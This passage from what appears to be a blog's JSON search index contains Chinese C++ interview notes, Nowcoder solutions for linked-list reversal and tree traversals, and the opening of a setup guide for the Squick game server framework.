//-2-delete[]mTest1;//-3-delete[]mTest2;//-4-\n\n在-4-处报错。\n这就说明：对于内建简单数据类型，delete和delete[]功能是相同的。对于自定义的复杂数据类型，delete和delete[]不能互用。delete[]删除一个数组，delete删除一个指针。简单来说，用new分配的内存用delete删除；用new[]分配的内存用delete[]删除。delete[]会调用数组元素的析构函数。内部数据类型没有析构函数，所以问题不大。如果你在用delete时没用括号，delete就会认为指向的是单个对象，否则，它就会认为指向的是一个数组。\n2. C++有哪些性质（面向对象特点）封装，继承和多态。\n4.子类析构时要调用父类的析构函数吗？析构函数调用的次序是先派生类的析构后基类的析构，也就是说在基类的的析构调用的时候,派生类的信息已经全部销毁了。定义一个对象时先调用基类的构造函数、然后调用派生类的构造函数；析构的时候恰好相反：先调用派生类的析构函数、然后调用基类的析构函数。\n5.多态，虚函数，纯虚函数多态：是对于不同对象接收相同消息时产生不同的动作。C++的多态性具体体现在运行和编译两个方面：在程序运行时的多态性通过继承和虚函数来体现；\n在程序编译时多态性体现在函数和运算符的重载上；\n虚函数：在基类中冠以关键字 virtual 的成员函数。 它提供了一种接口界面。允许在派生类中对基类的虚函数重新定义。\n纯虚函数的作用：在基类中为其派生类保留一个函数的名字，以便派生类根据需要对它进行定义。作为接口而存在 纯虚函数不具备函数的功能，一般不能直接被调用。\n从基类继承来的纯虚函数，在派生类中仍是虚函数。如果一个类中至少有一个纯虚函数，那么这个类被称为抽象类（abstract class）。\n抽象类中不仅包括纯虚函数，也可包括虚函数。抽象类必须用作派生其他类的基类，而不能用于直接创建对象实例。但仍可使用指向抽象类的指针支持运行时多态性。\n6.求下面函数的返回值（微软）int func(x) &#123; \tint countx = 0; \twhile(x) \t&#123; \t\tcountx ++; \t\tx = x&amp;(x-1); \t&#125; \treturn countx; &#125; \n\n假定x &#x3D; 9999。 答案：8\n思路：将x转化为2进制，看含有的1的个数。\n7.什么是“引用”？申明和使用“引用”要注意哪些问题？答：引用就是某个目标变量的“别名”(alias)，对应用的操作与对变量直接操作效果完全相同。申明一个引用的时候，切记要对其进行初始化。引用声明完毕后，相当于目标变量名有两个名称，即该目标原名称和引用名，不能再把该引用名作为其他变量名的别名。声明一个引用，不是新定义了一个变量，它只表示该引用名是目标变量名的一个别名，它本身不是一种数据类型，因此引用本身不占存储单元，系统也不给引用分配存储单元。不能建立数组的引用。\n8.将“引用”作为函数参数有哪些特点？（1）传递引用给函数与传递指针的效果是一样的。这时，被调函数的形参就成为原来主调函数中的实参变量或对象的一个别名来使用，所以在被调函数中对形参变量的操作就是对其相应的目标对象（在主调函数中）的操作。\n（2）使用引用传递函数的参数，在内存中并没有产生实参的副本，它是直接对实参操作；而使用一般变量传递函数的参数，当发生函数调用时，需要给形参分配存储单元，形参变量是实参变量的副本；如果传递的是对象，还将调用拷贝构造函数。因此，当参数传递的数据较大时，用引用比用一般变量传递参数的效率和所占空间都好。\n（3）使用指针作为函数的参数虽然也能达到与使用引用的效果，但是，在被调函数中同样要给形参分配存储单元，且需要重复使用”*指针变量名”的形式进行运算，这很容易产生错误且程序的阅读性较差；另一方面，在主调函数的调用点处，必须用变量的地址作为实参。而引用更容易使用，更清晰。\n9.在什么时候需要使用“常引用”？如果既要利用引用提高程序的效率，又要保护传递给函数的数据不在函数中被改变，就应使用常引用。常引用声明方式：const 类型标识符 &amp;引用名&#x3D;目标变量名；\n例1\nint a ;\nconst int &amp;ra&#x3D;a;\nra&#x3D;1; &#x2F;&#x2F;错误\na&#x3D;1; &#x2F;&#x2F;正确\n例2\nstring foo( );\nvoid bar(string &amp; s);\n那么下面的表达式将是非法的：\nbar(foo( ));\nbar(“hello world”);\n原因在于foo( )和”hello world”串都会产生一个临时对象，而在C++中，这些临时对象都是const类型的。因此上面的表达式就是试图将一个const类型的对象转换为非const类型，这是非法的。引用型参数应该在能被定义为const的情况下，尽量定义为const 。\n10.将“引用”作为函数返回值类型的格式、好处和需要遵守的规则?格式：类型标识符 &amp;函数名（形参列表及类型说明）{ &#x2F;&#x2F;函数体 }\n好处：在内存中不产生被返回值的副本；（注意：正是因为这点原因，所以返回一个局部变量的引用是不可取的。因为随着该局部变量生存期的结束，相应的引用也会失效，产生runtime error! \n注意事项：\n（1）不能返回局部变量的引用。这条可以参照Effective C++[1]的Item 31。主要原因是局部变量会在函数返回后被销毁，因此被返回的引用就成为了”无所指”的引用，程序会进入未知状态。\n（2）不能返回函数内部new分配的内存的引用。这条可以参照Effective C++[1]的Item 31。虽然不存在局部变量的被动销毁问题，可对于这种情况（返回函数内部new分配内存的引用），又面临其它尴尬局面。例如，被函数返回的引用只是作为一个临时变量出现，而没有被赋予一个实际的变量，那么这个引用所指向的空间（由new分配）就无法释放，造成memory leak。\n（3）可以返回类成员的引用，但最好是const。这条原则可以参照Effective C++[1]的Item 30。主要原因是当对象的属性是与某种业务规则（business rule）相关联的时候，其赋值常常与某些其它属性或者对象的状态有关，因此有必要将赋值操作封装在一个业务规则当中。如果其它对象可以获得该属性的非常量引用（或指针），那么对该属性的单纯赋值就会破坏业务规则的完整性。\n（4）流操作符重载返回值申明为“引用”的作用：\n流操作符&lt;&lt;和&gt;&gt;，这两个操作符常常希望被连续使用，例如：cout &lt;&lt; “hello” &lt;&lt; endl;　因此这两个操作符的返回值应该是一个仍然支持这两个操作符的流引用。可选的其它方案包括：返回一个流对象和返回一个流对象指针。但是对于返回一个流对象，程序必须重新（拷贝）构造一个新的流对象，也就是说，连续的两个&lt;&lt;操作符实际上是针对不同对象的！这无法让人接受。对于返回一个流指针则不能连续使用&lt;&lt;操作符。因此，返回一个流对象引用是惟一选择。这个唯一选择很关键，它说明了引用的重要性以及无可替代性，也许这就是C++语言中引入引用这个概念的原因吧。 \n赋值操作符&#x3D;。这个操作符象流操作符一样，是可以连续使用的，例如：x &#x3D; j &#x3D; 10;或者(x&#x3D;10)&#x3D;100;赋值操作符的返回值必须是一个左值，以便可以被继续赋值。因此引用成了这个操作符的惟一返回值选择。\n ＃include&lt;iostream.h&gt;int &amp;put(int n);int vals[10];int error=-1;void main()&#123;\tput(0)=10; //以put(0)函数值作为左值，等价于vals[0]=10; \tput(9)=20; //以put(9)函数值作为左值，等价于vals[9]=20; \tcout&lt;&lt;vals[0]; \tcout&lt;&lt;vals[9];&#125; int &amp;put(int n)&#123;\tif (n&gt;=0 &amp;&amp; n&lt;=9 ) return vals[n]; \telse &#123; cout&lt;&lt;&quot;subscript error&quot;; return error; &#125;&#125;\n\n（5）在另外的一些操作符中，却千万不能返回引用：+-*&#x2F; 四则运算符。它们不能返回引用，Effective C++[1]的Item23详细的讨论了这个问题。主要原因是这四个操作符没有side effect，因此，它们必须构造一个对象作为返回值，可选的方案包括：返回一个对象、返回一个局部变量的引用，返回一个new分配的对象的引用、返回一个静态对象引用。根据前面提到的引用作为返回值的三个规则，第2、3两个方案都被否决了。静态对象的引用又因为((a+b) &#x3D;&#x3D; (c+d))会永远为true而导致错误。所以可选的只剩下返回一个对象了。\n11、结构与联合有和区别？(1). 结构和联合都是由多个不同的数据类型成员组成, 但在任何同一时刻, 联合中只存放了一个被选中的成员（所有成员共用一块地址空间）, 而结构的所有成员都存在（不同成员的存放地址不同）。 \n(2). 对于联合的不同成员赋值, 将会对其它成员重写, 原来成员的值就不存在了, 而对于结构的不同成员赋值是互不影响的。\n12、试写出程序结果：int  a=4;int  &amp;f(int x)&#123;    a=a+x;  \treturn  a;&#125;int main(void) &#123;\tint   t=5;    cout&lt;&lt;f(t)&lt;&lt;endl;  //a = 9    f(t)=20;             //a = 20    cout&lt;&lt;f(t)&lt;&lt;endl;     //t = 5,a = 20  a = 25    t=f(t);               // a = 30 t = 30    cout&lt;&lt;f(t)&lt;&lt;endl;   //t = 60&#125;\n\n\n\n13.重载（overload)和重写(overried，有的书也叫做“覆盖”）的区别？常考的题目。从定义上来说：\n重载：是指允许存在多个同名函数，而这些函数的参数表不同（或许参数个数不同，或许参数类型不同，或许两者都不同）。\n重写：是指子类重新定义父类虚函数的方法。\n从实现原理上来说：\n重载：编译器根据函数不同的参数表，对同名函数的名称做修饰，然后这些同名函数就成了不同的函数（至少对于编译器来说是这样的）。如，有两个同名函数：function func(p:integer):integer;和function func(p:string):integer;。那么编译器做过修饰后的函数名称可能是这样的：int_func、str_func。对于这两个函数的调用，在编译器间就已经确定了，是静态的。也就是说，它们的地址在编译期就绑定了（早绑定），因此，重载和多态无关！\n重写：和多态真正相关。当子类重新定义了父类的虚函数后，父类指针根据赋给它的不同的子类指针，动态的调用属于子类的该函数，这样的函数调用在编译期间是无法确定的（调用的子类的虚函数的地址无法给出）。因此，这样的函数地址是在运行期绑定的（晚绑定）。\n14.有哪几种情况只能用intialization list 而不能用assignment?当类中含有const、reference 成员变量；基类的构造函数都需要初始化表。\n15. C++是不是类型安全的？不是。两个不同类型的指针之间可以强制转换（用reinterpret cast)。C#是类型安全的。\n16. main 函数执行以前，还会执行什么代码？全局对象的构造函数会在main 函数之前执行。\n17. 描述内存分配方式以及它们的区别?1） 从静态存储区域分配。内存在程序编译的时候就已经分配好，这块内存在程序的整个运行期间都存在。例如全局变量，static 变量。\n2） 在栈上创建。在执行函数时，函数内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放。栈内存分配运算内置于处理器的指令集。\n3） 从堆上分配，亦称动态内存分配。程序在运行的时候用malloc 或new 申请任意多少的内存，程序员自己负责在何时用free 或delete 释放内存。动态内存的生存期由程序员决定，使用非常灵活，但问题也最多。\n18.分别写出BOOL,int,float,指针类型的变量a 与“零”的比较语句。BOOL : if ( !a ) or if(a)\nint : if ( a &#x3D;&#x3D; 0)\nfloat : const EXPRESSION EXP &#x3D; 0.000001\nif ( a &lt; EXP &amp;&amp; a &gt;-EXP)\npointer : if ( a !&#x3D; NULL) or if(a &#x3D;&#x3D; NULL)\n19.请说出const与#define 相比，有何优点？const作用：定义常量、修饰函数参数、修饰函数返回值三个作用。被Const修饰的东西都受到强制保护，可以预防意外的变动，能提高程序的健壮性。\n1） const 常量有数据类型，而宏常量没有数据类型。编译器可以对前者进行类型安全检查。而对后者只进行字符替换，没有类型安全检查，并且在字符替换可能会产生意料不到的错误。\n2） 有些集成化的调试工具可以对const 常量进行调试，但是不能对宏常量进行调试。\n20.简述数组与指针的区别？数组要么在静态存储区被创建（如全局数组），要么在栈上被创建。指针可以随时指向任意类型的内存块。\n(1)修改内容上的差别\nchar a[] &#x3D; “hello”;\na[0] &#x3D; ‘X’;\nchar *p &#x3D; “world”; &#x2F;&#x2F; 注意p 指向常量字符串\np[0] &#x3D; ‘X’; &#x2F;&#x2F; 编译器不能发现该错误，运行时错误\n(2) 用运算符sizeof 可以计算出数组的容量（字节数）。sizeof(p),p 为指针得到的是一个指针变量的字节数，而不是p 所指的内存容量。C++&#x2F;C 语言没有办法知道指针所指的内存容量，除非在申请内存时记住它。注意当数组作为函数的参数进行传递时，该数组自动退化为同类型的指针。\nchar a[] &#x3D; “hello world”;\nchar *p &#x3D; a;\ncout&lt;&lt; sizeof(a) &lt;&lt; endl; &#x2F;&#x2F; 12 字节\ncout&lt;&lt; sizeof(p) &lt;&lt; endl; &#x2F;&#x2F; 4 字节\n计算数组和指针的内存容量\nvoid Func(char a[100])\n{\ncout&lt;&lt; sizeof(a) &lt;&lt; endl; &#x2F;&#x2F; 4 字节而不是100 字节\n}\n21. int (*s[10])(int) 表示的是什么？int (*s[10])(int) 函数指针数组，每个指针指向一个int func(int param)的函数。\n22. 栈内存与文字常量区       char str1[] = &quot;abc&quot;;\n\n　　char str2[] &#x3D; “abc”;\n　　const char str3[] &#x3D; “abc”;　　const char str4[] &#x3D; “abc”;\n　　const char *str5 &#x3D; “abc”;　　const char *str6 &#x3D; “abc”;\n　　char *str7 &#x3D; “abc”;　　char *str8 &#x3D; “abc”;\n　　cout &lt;&lt; ( str1 &#x3D;&#x3D; str2 ) &lt;&lt; endl;&#x2F;&#x2F;0  分别指向各自的栈内存　　cout &lt;&lt; ( str3 &#x3D;&#x3D; str4 ) &lt;&lt; endl;&#x2F;&#x2F;0  分别指向各自的栈内存　　cout &lt;&lt; ( str5 &#x3D;&#x3D; str6 ) &lt;&lt; endl;&#x2F;&#x2F;1指向文字常量区地址相同\n　　cout &lt;&lt; ( str7 &#x3D;&#x3D; str8 ) &lt;&lt; endl;&#x2F;&#x2F;1指向文字常量区地址相同\n　　结果是：0 0 1 1\n　　解答：str1,str2,str3,str4是数组变量，它们有各自的内存空间；而str5,str6,str7,str8是指针，它们指向相同的常量区域。\n23. 将程序跳转到指定内存地址要对绝对地址0x100000赋值，我们可以用(unsigned int*)0x100000 &#x3D; 1234;那么要是想让程序跳转到绝对地址是0x100000去执行，应该怎么做？\n　　((void ()( ))0x100000 ) ( );　　首先要将0x100000强制转换成函数指针,即:　　(void ()())0x100000　　然后再调用它:　　((void ()())0x100000)();　　用typedef可以看得更直观些:　　typedef void()() voidFuncPtr;　　*((voidFuncPtr)0x100000)();\n24. int id[sizeof(unsigned long)];这个对吗？为什么？ 答案:正确 这个 sizeof是编译时运算符，编译时就确定了  ,可以看成和机器有关的常量。\n25. 引用与指针有什么区别？【参考答案】                         \n\n引用必须被初始化，指针不必。\n\n引用初始化以后不能被改变，指针可以改变所指的对象。\n\n不存在指向空值的引用，但是存在指向空值的指针。\n\n\n26. const  与 #define 的比较 ，const有什么优点?（1） const 常量有数据类型，而宏常量没有数据类型。编译器可以对前者进行类型安全检查。而对后者只进行字符替换，没有类型安全检查，并且在字符替换可能会产生意料不到的错误（边际效应） 。\n（2）  有些集成化的调试工具可以对 const 常量进行调试，但是不能对宏常量进行调试。\n27. 复杂声明void * ( * (*fp1)(int))[10];\nfloat (*(* fp2)(int,int,int))(int);\nint (* ( * fp3)())[10]();\n分别表示什么意思？\n1.void * ( * (*fp1)(int))[10];   fp1是一个指针，指向一个函数，这个函数的参数为int型，函数的返回值是一个指针，这个指针指向一个数组，这个数组有10个元素，每个元素是一个void*型指针。\n2.float (*(* fp2)(int,int,int))(int);   fp2是一个指针，指向一个函数，这个函数的参数为3个int型，函数的返回值是一个指针，这个指针指向一个函数，这个函数的参数为int型，函数的返回值是float型。\n3.int (* ( * fp3)())[10]();   fp3是一个指针，指向一个函数，这个函数的参数为空，函数的返回值是一个指针，这个指针指向一个数组，这个数组有10个元素，每个元素是一个指针，指向一个函数，这个函数的参数为空，函数的返回值是int型。\n28. 内存的分配方式有几种?一、从静态存储区域分配。内存在程序编译的时候就已经分配好，这块内存在程序的整个运行期间都存在。例如全局变量。\n二、在栈上创建。在执行函数时，函数内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放。栈内存分配运算内置于处理器的指令集中，效率很高，但是分配的内存容量有限。\n三、从堆上分配，亦称动态内存分配。程序在运行的时候用malloc或new申请任意多少的内存，程序员自己负责在何时用free或delete释放内存。动态内存的生存期由我们决定，使用非常灵活，但问题也最多。\n29. 基类的析构函数不是虚函数，会带来什么问题？派生类的析构函数用不上，会造成资源的泄漏。\n30. 全局变量和局部变量有什么区别？是怎么实现的？操作系统和编译器是怎么知道的？生命周期不同：\n全局变量随主程序创建和创建，随主程序销毁而销毁；局部变量在局部函数内部，甚至局部循环体等内部存在，退出就不存在；\n使用方式不同：通过声明后全局变量程序的各个部分都可以用到；局部变量只能在局部使用；分配在栈区。 \n操作系统和编译器通过内存分配的位置来知道的，全局变量分配在全局数据段并且在程序开始运行的时候被加载。局部变量则分配在堆栈里面 。\n31. 宏定义和内联函数的区别1.宏定义不是函数，预处理器用赋值宏代码的方式代替函数的调用，省去了函数压栈退栈过程。\n内联函数本质是一个函数，不能包含复杂的控制，如果内敛函数体过大，编译器会自动把这个内联函数变成普通函数\n\n内联函数是在编译的时候进行代码插入，编译器在调用内联函数的地方直接把内联函数内容展开。省区函数的调用开销。\n2 宏定义没有类型检查。内联函数在编译的时候进行类型检查\n3 宏定义和内敛都是进行diamagnetic展开。不同点，宏定义在预编译的时候把所有宏名字替换，内联函数在编译阶段把所有调用内敛函数的地方进行内联函数插入，省区函数压栈清栈\nref：https://blog.csdn.net/fakine/article/details/51321544 \n32. 静态、动态链接？1、什么是静态链接？\n静态链接是由链接器在链接时将库的内容加入到可执行程序中的做法。\n链接器是一个独立程序，将一个或多个库或目标文件（先前由编译器或汇编器生成）链接到一块生成可执行程序。\n这里的库指的是静态链接库，Windows下以.lib为后缀，Linux下以.a为后缀。\n2、什么是动态链接？\n动态链接（Dynamic Linking），把链接这个过程推迟到了运行时再进行，在可执行文件装载时或运行时，由操作系统的装载程序加载库。\n这里的库指的是动态链接库，Windows下以.dll为后缀，Linux下以.so为后缀。\n值得一提的是，在Windows下的动态链接也可以用到.lib为后缀的文件，但这里的.lib文件叫做导入库，是由.dll文件生成的。\n3、静态链接与动态链接的优缺点？\n（1）静态链接的优缺点：\n优点：\n代码装载速度快，执行速度略比动态链接库快；只需保证在开发者的计算机中有正确的.lib文件，在以二进制形式发布程序时不需考虑在用户的计算机上.lib文件是否存在及版本问题。缺点：\n使用静态链接生成的可执行文件体积较大，包含相同的公共代码，造成浪费。（2）动态链接的优缺点：\n优点：\n生成的可执行文件较静态链接生成的可执行文件小；适用于大规模的软件开发，使开发过程独立、耦合度小，便于不同开发者和开发组织之间进行开发和测试；不同编程语言编写的程序只要按照函数调用约定就可以调用同一个DLL函数；DLL文件与EXE文件独立，只要输出接口不变（即名称、参数、返回值类型和调用约定不变），更换DLL文件不会对EXE文件造成任何影响，因而极大地提高了可维护性和可扩展性；缺点：\n使用动态链接库的应用程序不是自完备的，它依赖的DLL模块也要存在，如果使用载入时动态链接，程序启动时发现DLL不存在，系统将终止程序并给出错误信息；速度比静态链接慢；\n","categories":["language"],"tags":["cpp"]},{"title":"牛客","url":"/2022/09/26/dev/code/nowcoder/","content":"小红划数字小红拿到了一个正整数  。对于任意大于  的数而言，她每次操作可以划掉这个数的一个数字，生成一个新的数。例如，对于正整数  而言，小红经过一次操作可以生成  、 、 、 、 这五种数字。小红想知道，自己最少操作多少次，可以把  变成一个偶数？\n数据范围：进阶：空间复杂度  ，时间复杂度 \n输入描述:一个正整数  \n输出描述:小红操作的最少次数。如果小红无论如何也不能生成偶数，则输出-1。示例1输入\n102\n\n\n输出\n0\n\n\n说明显然102本身就是偶数，小红不需要进行操作。示例2输入\n12321\n\n\n输出\n1\n\n\n说明把最后一个1划掉，形成1232，是偶数。可以证明这样操作是最少的。示例3输入\n7\n\n\n输出\n-1\n\n\n说明\n无法进行删除得到偶数。 \n#include &lt;iostream&gt;using namespace std;int solve(int n) &#123;    if(n % 2 == 0) return 0;    if(n &lt; 9) return -1;    int i = 0, l = 0;    while(n &gt; 0) &#123;        l++;        n -= n % 10;        n /= 10;        if(n % 2 != 0)            i ++;        else break;    &#125;    //cout &lt;&lt; &quot;i: &quot; &lt;&lt; i &lt;&lt; endl;    //cout &lt;&lt; &quot;l: &quot; &lt;&lt; l &lt;&lt; endl;    if((l - 1) == i &amp;&amp; n == 0) &#123;        return -1;    &#125;    return i + 1;&#125;int main(void) &#123;    int n = 0;    cin &gt;&gt; n;    cout &lt;&lt; solve(n);&#125;\n\n\n\n\n\n\n\n反转链表链接：https://www.nowcoder.com/profile/842917744/codeBookDetail?submissionId=400949732\n描述：\n给定一个单链表的头结点pHead(该头节点是有值的，比如在下图，它的val是1)，长度为n，反转该链表后，返回新链表的表头。\n数据范围： \n要求：空间复杂度  ，时间复杂度  。\n如当输入链表{1,2,3}时，\n经反转后，原链表变为{3,2,1}，所以对应的输出为{3,2,1}。\n以上转换过程如下图所示：\n\n\n代码：\n提交时间：2022-09-25 语言：C++ 运行时间： 4 ms 占用内存：564K 状态：答案正确\n/*struct ListNode &#123;    int val;    struct ListNode *next;    ListNode(int x) :            val(x), next(NULL) &#123;    &#125;&#125;;*/class Solution &#123;  public:    ListNode* ReverseList(ListNode* pHead) &#123;        if(pHead == nullptr) &#123;            return nullptr;        &#125;                 ListNode* pNode = pHead;         ListNode* pNodeNext = pHead-&gt;next; // 记录当前node 的下一个        ListNode* pNodeLast = pHead; // 记录上一个node，也可以为空，但后面需要做一下判断是否为第一个节点，是的话，在做反转的时候，需要将第一个节点设置为空。        ListNode* pNodeTmp = nullptr;         while (pNode) &#123;            if(pNodeNext) &#123;                pNodeTmp = pNodeNext-&gt;next;                pNodeNext-&gt;next = pNode;            &#125;            pNodeLast = pNode;             pNode = pNodeNext; // 往下移动            pNodeNext = pNodeTmp;            if(pNodeLast == pHead) &#123; //判断是否为第一个节点                pNodeLast-&gt;next = nullptr;            &#125;        &#125;        return pNodeLast;      &#125;&#125;;\n\n\n\n二叉树的三种遍历链接：https://www.nowcoder.com/profile/842917744/codeBookDetail?submissionId=400949732\n前序遍历知识前序遍历是，先遍历根节点，再遍历左子树，最后遍历右子树。\n描述给你二叉树的根节点 root ，返回它节点值的 前序 遍历。\n数据范围：二叉树的节点数量满足  ，二叉树节点的值满足  ，树的各节点的值各不相同\n示例 1：\n思路优先不断从做左子树遍历到底，杀入树多左边最底部，再通过回溯方式，从底部慢慢向上的右子树遍历。我们只需在遍历左子树节点的时候，push当前值就为前序遍历的结果了。\n代码提交时间：2022-09-25 语言：C++ 运行时间： 4 ms 占用内存：468K 状态：答案正确\n/** * struct TreeNode &#123; *  int val; *  struct TreeNode *left; *  struct TreeNode *right; *  TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125; * &#125;; */class Solution &#123;  public:    /**     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可     *     *     * @param root TreeNode类     * @return int整型vector     */    vector&lt;int&gt; preorderTraversal(TreeNode* root) &#123;        // write code here        TreeNode* now = root;        TreeNode* subLeft = nullptr;        TreeNode* subRight = nullptr;        std::stack&lt;TreeNode*&gt; treeStack;        std::vector&lt;int&gt; ret;        //treeStack.push(root);        // 遍历左节点         while (now || treeStack.size()) &#123;            while(now) &#123;                treeStack.push(now);                ret.push_back(now-&gt;val);                now = now-&gt;left;            &#125;                         if(treeStack.size()) &#123;                now = treeStack.top();                treeStack.pop();                now = now-&gt;right;            &#125;                     &#125;         return ret;      &#125;&#125;;\n\n\n\n中序遍历知识前序遍历是，先遍历左子树，再遍历根节点，最后遍历右子树。\n描述给定一个二叉树的根节点root，返回它的中序遍历结果。\n数据范围：树上节点数满足 ，树上每个节点的值满足 进阶：空间复杂度 ，时间复杂度 \n思路与前序遍历方式相同， 只是再回溯的过程进行保存根节点的值就为中序遍历的结果。\n代码提交时间：2022-09-26 语言：C++ 运行时间： 5 ms 占用内存：440K 状态：答案正确\n/** * struct TreeNode &#123; *\tint val; *\tstruct TreeNode *left; *\tstruct TreeNode *right; *\tTreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125; * &#125;; */class Solution &#123;public:    /**     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可     *     *      * @param root TreeNode类      * @return int整型vector     */    vector&lt;int&gt; inorderTraversal(TreeNode* root) &#123;        // write code here        TreeNode *now = root;        std::stack&lt;TreeNode *&gt;treeStack;        std::vector&lt;int&gt;ret;         while(now || treeStack.size()) &#123;            while(now) &#123;                treeStack.push(now);                                now = now-&gt;left;            &#125;            if(treeStack.size()) &#123;                now = treeStack.top();                treeStack.pop();                ret.push_back(now-&gt;val);                now = now-&gt;right;            &#125;        &#125;        return ret;    &#125;&#125;;\n\n\n\n后序遍历知识后序遍历是，先遍历左子树，再遍历右子树，最后再遍历根节点。\n描述给定一个二叉树，返回他的后序遍历的序列。\n后序遍历是值按照 左节点-&gt;右节点-&gt;根节点 的顺序的遍历。\n数据范围：二叉树的节点数量满足  ，二叉树节点的值满足  ，树的各节点的值各不相同\n样例图\n\n思路这个相对比较复杂一点，需要在回溯上进行一步操作，之前的回溯只是简单的移动节点到右子节点上，那么我们的遍历有点类似于横向的遍历方式，只不过横向的深度有限从左边开始遍历的。\n代码提交时间：2022-09-26 语言：C++ 运行时间： 4 ms 占用内存：396K 状态：答案正确\n/** * struct TreeNode &#123; *\tint val; *\tstruct TreeNode *left; *\tstruct TreeNode *right; *\tTreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125; * &#125;; */class Solution &#123;public:    /**     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可     *     *      * @param root TreeNode类      * @return int整型vector     */    vector&lt;int&gt; postorderTraversal(TreeNode* root) &#123;        // write code here        stack&lt;TreeNode *&gt; nodeStack;        vector&lt;int&gt; ret;        TreeNode *now = root;        TreeNode *p = nullptr;        int flag = 1;        bool isExit = false;        while((now || nodeStack.size()) &amp;&amp; !isExit) &#123;            while(now) &#123; //让当前node杀入左子树底部                nodeStack.push(now);                now = now-&gt;left;            &#125;            flag = 1; // 用一个flag代表当前节点是否可以访问，每次回溯的时候都至少可以回溯一次。            p = nullptr; // 记录先前的右子节点，每次回溯的时候默认为空。                        while(nodeStack.size() &amp;&amp; flag) &#123;                now = nodeStack.top();                if(now-&gt;right == p) &#123; //判断一下当前右子节点是否为先前保存的右子节点                    ret.push_back(now-&gt;val);                    nodeStack.pop();                    if(now == root) &#123; // 检测到时根的时候，退出                        isExit = true;                        break;                    &#125;                    p = now;                &#125;else &#123;                    // 向右横向移动，且不弹栈                    now = now-&gt;right;                    flag = 0; // 直接跳出有先去遍历左子树                &#125;            &#125;        &#125;        return ret;    &#125;&#125;;\n\n\n\n\n\n","categories":["algorithm"],"tags":["nowcoder"]},{"title":"Squick游戏服务器框架","url":"/2022/09/17/dev/game/server/Squick%E7%BD%91%E7%BB%9C%E6%B8%B8%E6%88%8F%E6%A1%86%E6%9E%B6/","content":"Squick游戏服务器框架Squick是什么?Squick是一款可快速开发拓展的游戏服务器开发框架，轻量，插件化，易拓展，支持lua脚本。\nGithub: https://github.com/pwnsky/squick\n目前正在极速开发Unity客户端SDK中，客户端sdk: https://github.com/i0gan/Uquick\n特性\n易使用，采用。\n\n采用动态连链接库方式动态加载插件，开发拓展插件，让开发服务器变成开发插件。\n\n遵守谷歌C++编程规范\n\n事件和属性驱动，让开发变得更简单。\n\nExcel实现服务端配置\n\n日志捕获系统\n\n支持Lua脚本开发\n\n支持部分不用停服即可热更\n\n默认拥有服务器插件：代理服务器、世界服务器、导航系统、数据库服务器、中心服务器、登录服务器\n\n\n快速运行Demo编译服务端git clone https://github.com/pwnsky/squick.gitcd squickbash install.sh\n\n如果不能编译，可能是缺少依赖，打开third_party&#x2F;install.sh 里查看需要安装的依赖。\n编译\n./build.sh\n\n编译成功后，可执行以及插件会在{project_path}&#x2F;build&#x2F;server 下，如下\nserver├── lib│   ├── skcore.so│   ├── squick_plugin_loader.so│   └── squick_struct.so├── plugin│   ├── core│   │   ├── actor.so│   │   ├── config.so│   │   ├── kernel.so│   │   ├── log.so│   │   ├── lua.so│   │   ├── navigation.so│   │   ├── net.so│   │   ├── nosql.so│   │   ├── security.so│   │   └── test.so│   └── extend│       ├── db│       │   ├── client.so│       │   ├── logic.so│       │   └── server.so│       ├── game│       │   ├── client.so│       │   ├── logic.so│       │   └── server.so│       ├── login│       │   ├── client.so│       │   ├── http_server.so│       │   ├── logic.so│       │   └── server.so│       ├── master│       │   ├── http_server.so│       │   ├── logic.so│       │   └── server.so│       ├── others│       │   ├── chat.so│       │   ├── consume_manager.so│       │   └── inventory.so│       ├── proxy│       │   ├── client.so│       │   ├── logic.so│       │   └── server.so│       └── world│           ├── client.so│           └── server.so└── squick\n\n\n\n运行服务端通过debug.sh脚本或者start.sh启动服务，debug.sh用于方便实时查看输出信息，start.sh后台启动，主要用于发布版本的启动。\ncd ./build./debug.sh # 或 ./start.sh\n\n\n\n搭建redis服务器服务器的数据库默认为redis服务器，这里采用docker来进行搭建。\ndocker pull redisdocker run --name redis-cache -p 10086:6379  -d redis --requirepass pwnsky # pwnsky 是密码\n\n打开： build&#x2F;config&#x2F;excel&#x2F;side&#x2F;NoSqlServer.xlsx 修改数据库连接IP和端口\n但是在修改后，需要重新生成新的配置文件，执行以下命令。\ncd ./build/config/tools./gen_config.sh\n\ntips:\nredis查看\nredis-cli -h 127.0.0.1 -p 10086auth pwnsky    # pwnsky 是密码keys *         # 查看所有key\n\nredis常用命令: https://blog.csdn.net/Kristabo/article/details/125384059\n客户端https://github.com/i0gan/Uquick 下载下来，采用Unity打开，我采用的是2020.03.xx。\n快速入门了解Squick制作插件服务端教学自定义实现登录自定义消息ID，在src/squick/struct/define.proto, 默认已经定义\nREQ_LOGIN\t\t\t\t\t\t\t\t= 101;     \t//ACK_LOGIN\t\t\t\t\t\t\t\t= 102;     \t//\n\n定义消息结构，NFComm/NFMessageDefine/NFMsgPreGame.proto\nmessage ReqAccountLogin&#123;     bytes \t\t\taccount = 2;    bytes \t\t\tpassword = 3;    bytes \t\t\tsecurity_code = 4;    bytes \t\t\tsignBuff = 5;    int32 \t\t\tclientVersion = 6;    ELoginMode\t\tloginMode = 7;    int32 \t\t\tclientIP = 8;    int64 \t\t\tclientMAC = 9;    bytes \t\t\tdevice_info = 10;    bytes \t\t\textra_info = 11;    int32 \t\t\tplatform_type = 12;&#125;\n\n修改完毕后，需要通过protoc重新生成新的C++和CS代码\ncd &#123;project_path&#125;/src/squick/struct./gen_code.sh\n\n运行后会自动将生成代码文件，并将CS代码复制到客户端项目Assets/Resources/SquickConfig/\n增加一个登录系统模块，默认已经实现。\n打开src/server/login/plugin/server/server_module.cc\n在AfterInit函数李增加回调，默认已实现\nm_pNetModule-&gt;AddReceiveCallBack(NFMsg::REQ_LOGIN, this, &amp;NFLoginNet_ServerModule::OnLoginProcess);\n\nOnLoginProcess回调函数如下：\nvoid NFLoginNet_ServerModule::OnLoginProcess(const NFSOCK sockIndex, const int msgID, const char* msg, const uint32_t len)&#123;\tNFGUID 